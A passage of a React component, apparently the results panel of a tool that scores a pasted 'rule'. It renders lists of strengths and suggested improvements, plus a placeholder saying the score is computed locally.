                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-auto">
                    <div>
                      <p className="text-xs font-medium text-emerald-400 mb-2 flex items-center gap-1">
                        <TrendingUp className="w-3 h-3" /> Strengths
                      </p>
                      <ul className="space-y-1">
                        {qualityResult.strengths.map((s, i) => (
                          <li key={i} className="text-xs text-gray-500 flex items-start gap-1.5">
                            <CheckCircle2 className="w-3 h-3 text-emerald-500/60 flex-shrink-0 mt-0.5" />
                            {s}
                          </li>
                        ))}
                      </ul>
                    </div>
                    <div>
                      <p className="text-xs font-medium text-orange-400 mb-2 flex items-center gap-1">
                        <TrendingDown className="w-3 h-3" /> Improvements
                      </p>
                      <ul className="space-y-1">
                        {qualityResult.improvements.map((imp, i) => (
                          <li key={i} className="text-xs text-gray-500 flex items-start gap-1.5">
                            <Minus className="w-3 h-3 text-orange-400/60 flex-shrink-0 mt-0.5" />
                            {imp}
                          </li>
                        ))}
                      </ul>
                    </div>
                  </div>
                </>
              ) : (
                <div className="flex-1 flex items-center justify-center text-center">
                  <div>
                    <Star className="w-8 h-8 text-gray-700 mx-auto mb-3" />
                    <p className="text-sm text-gray-600">Paste a rule and click Evaluate</p>
                    <p className="text-xs text-gray-700 mt-1">Score is computed locally, no backend needed</p>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
